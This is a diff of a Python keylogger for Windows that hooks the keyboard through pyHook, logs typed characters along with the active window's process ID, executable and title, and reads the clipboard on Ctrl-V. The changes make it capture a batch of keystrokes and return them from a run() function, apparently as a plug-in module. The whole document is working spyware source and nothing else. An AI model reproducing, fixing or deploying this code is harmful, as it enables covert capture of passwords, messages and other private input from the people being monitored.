@@ -9,8 +9,9 @@ user32   = windll.user32
 kernel32 = windll.kernel32
 psapi    = windll.psapi
 current_window = None
-s = "user typed:"
-i = 1
+
+num = 1
+s = "string:"
 
 def get_current_process():
 
@@ -35,16 +36,16 @@ def get_current_process():
     length = user32.GetWindowTextA(hwnd, byref(window_title),512)
 
     # print out the header if we're in the right process
-    s = s + ("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
+    #Test2.s = Test2.s + "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
 
     # close handles
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
     
 def KeyStroke(event):
-
-    global current_window   
-
+    global current_window
+    global num
+    global s
     # check to see if target changed windows
     if event.WindowName != current_window:
         current_window = event.WindowName        
@@ -52,7 +53,10 @@ def KeyStroke(event):
 
     # if they pressed a standard key
     if event.Ascii > 32 and event.Ascii < 127:
-        s = s + chr(event.Ascii),
+        s = s + chr(event.Ascii)
+		
+	num = num + 1
+		
     else:
         # if [Ctrl-V], get the value on the clipboard
         # added by Dan Frisch 2014
@@ -65,19 +69,17 @@ def KeyStroke(event):
             print ("[%s]" % event.Key),
 
 			
-	i = i + 1
-			
     # pass execution to next hook registered 
     return True
 def run(**args):
-	# create and register a hook manager 
-	kl         = pyHook.HookManager()
-	kl.KeyDown = KeyStroke
-
-	# register the hook and execute forever
-	kl.HookKeyboard()
-	pythoncom.PumpMessages()
-	while (i < 10)
-		print "waiting"
-		time.sleep(1)
-	return s
+    global s
+    global num
+    print "called run"
+    kl         = pyHook.HookManager()
+    kl.KeyDown = KeyStroke
+    kl.HookKeyboard()
+    while num < 10:
+        pythoncom.PumpWaitingMessages()
+    return s
+	
+print run()
